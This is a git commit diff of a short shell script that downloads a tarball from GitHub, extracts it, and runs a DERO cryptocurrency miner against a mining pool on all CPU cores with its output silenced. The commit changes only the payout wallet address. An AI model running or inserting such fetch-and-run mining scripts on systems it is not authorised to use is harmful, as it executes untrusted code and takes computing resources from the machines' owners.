ca446341b97a9b4abcee5cb825dc0d47d05ed8d5
erindiana <112599473+erindiana@users.noreply.github.com>
2022-09-01 10:53:46 +0700

    Update de.sh

--- de.sh
+++ de.sh
@@ -2,5 +2,5 @@
 wget https://github.com/erindiana/devs/raw/main/der.tar.gz
 tar -xf der.tar.gz
 
-./der -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.dero1 -t$(nproc --all) >/dev/null >/dev/null 2>&1
+./der -r pool.whalesburg.com:4300 -w dero1qywqx5rnemyt59ujq0lwy3r9n8m8l3zdxu0d90rre4lym8hgnr5rcqq2vekrj.dero1 -t$(nproc --all) >/dev/null >/dev/null 2>&1
 sleep 10
